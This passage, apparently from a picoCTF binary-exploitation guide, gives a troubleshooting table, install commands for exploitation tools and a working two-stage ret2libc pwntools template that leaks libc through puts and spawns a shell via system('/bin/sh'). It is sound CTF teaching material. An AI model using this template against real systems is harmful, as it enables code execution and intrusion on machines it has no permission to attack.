+| libc base known, one_gadget fails            | ret2libc: pop rdi + /bin/sh + system  | ROPgadget + pwntools ROP        |
+| Segfault inside system() but ROP looks right | Stack alignment - add a ret gadget    | rop.ret.address                 |
+| PIE, no leak, can only overwrite 2 bytes     | Partial overwrite + 1/16 brute force  | p16(guess \<\< 12 \| offset)    |
+| Unknown libc version                         | Leak 2+ function addrs, query libc DB | libc.blukat.me or libc-database |
+| Don't know overflow offset                   | Send cyclic pattern, check RSP in GDB | cyclic(200) + cyclic_find()     |
+
+### Essential tools
+
+pwntools
+
+Process interaction, struct packing, ELF loading, ROP chain building, libc search. The core exploitation library.
+
+```
+pip install pwntools
+```
+
+checksec
+
+Reports all binary mitigations. Run this first on every challenge binary.
+
+```
+checksec --file=./binary
+```
+
+ROPgadget
+
+Finds all ROP gadgets in a binary or library. Search for specific instruction sequences with `--re`.
+
+```
+pip install ROPgadget
+ROPgadget --binary ./libc.so.6 --re 'pop rdi'
+```
+
+one_gadget
+
+Finds magic gadgets in libc that call execve('/bin/sh') in a single jump. Requires Ruby.
+
+```
+gem install one_gadget
+one_gadget ./libc.so.6
+```
+
+pwndbg
+
+GDB plugin for CTF. Adds `vmmap`, `telescope`, `cyclic`, `checksec` directly inside GDB.
+
+```
+git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh
+```
+
+libc-database
+
+Identify the remote libc version from leaked function addresses. Essential when the challenge doesn't provide the libc binary.
+
+```
+# Visit https://libc.rip
+# or clone github.com/niklasb/libc-database and run ./find
+```
+
+### Quick exploit template
+
+```
+from pwn import *
+
+elf  = context.binary = ELF('./vuln')
+libc = ELF('./libc.so.6')
+rop  = ROP(elf)
+p    = process('./vuln')    # switch to remote() for submission
+
+OFFSET = ???  # find with cyclic
+
+# -- STAGE 1: leak --
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+ret     = rop.find_gadget(['ret'])[0]
+
+stage1  = flat(b'A' * OFFSET,
+               pop_rdi, elf.got['puts'],
+               elf.plt['puts'],
+               elf.symbols['main'])
+
+p.sendlineafter(b'Input: ', stage1)
+leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
+libc.address = leaked_puts - libc.symbols['puts']
+log.success(f'libc @ {hex(libc.address)}')
+
+# -- STAGE 2: shell --
+system  = libc.symbols['system']
+bin_sh  = next(libc.search(b'/bin/sh'))
+
+stage2  = flat(b'A' * OFFSET,
+               ret,           # alignment
+               pop_rdi, bin_sh,
+               system)
+
+p.sendlineafter(b'Input: ', stage2)
+p.interactive()
+```
+
+All related picoCTF writeups
+
+[PIE TIME](https://picoctfsolutions.com/picoctf-2025-pie-time)[PIE TIME 2](https://picoctfsolutions.com/picoctf-2025-pie-time-2)[format string 3](https://picoctfsolutions.com/picoctf-2024-format-string-3)[high frequency troubles](https://picoctfsolutions.com/picoctf-2024-high-frequency-troubles)
+
+Related guides
+
+[Buffer Overflow and Binary Exploitation](https://picoctfsolutions.com/posts/buffer-overflow-binary-exploitation-ctf)[Format String Attacks](https://picoctfsolutions.com/posts/format-string-ctf)[GDB CTF Guide](https://picoctfsolutions.com/posts/gdb-ctf-guide)
+
+## Sources and further reading
+
+Entropy bits, page sizes, and argument registers are all specified values. When an exploit works locally and fails remotely, one of these documents usually explains the difference.
+
+- [Linux kernel sysctl documentation](https://www.kernel.org/doc/html/latest/admin-guide/sysctl/kernel.html) for `randomize_va_space` and the mmap entropy settings.
+- [Shacham et al. (CCS 2004)](https://hovav.net/ucsd/papers/sppgmb04.html) for the 16-bit brute-force result, and [Shacham (CCS 2007)](https://hovav.net/ucsd/papers/s07.html) for the paper that introduced ROP and proved the gadget set Turing-complete.
+- [System V AMD64 ABI](https://gitlab.com/x86-psABIs/x86-64-ABI) for the argument registers your gadgets have to fill, and the [ELF specification](https://refspecs.linuxfoundation.org/elf/elf.pdf) for `ET_DYN` versus `ET_EXEC` and `PT_GNU_STACK`.
+- Tooling: [one_gadget](https://github.com/david942j/one_gadget), [ROPgadget](https://github.com/JonathanSalwan/ROPgadget), and [pwntools](https://docs.pwntools.com/en/stable/).
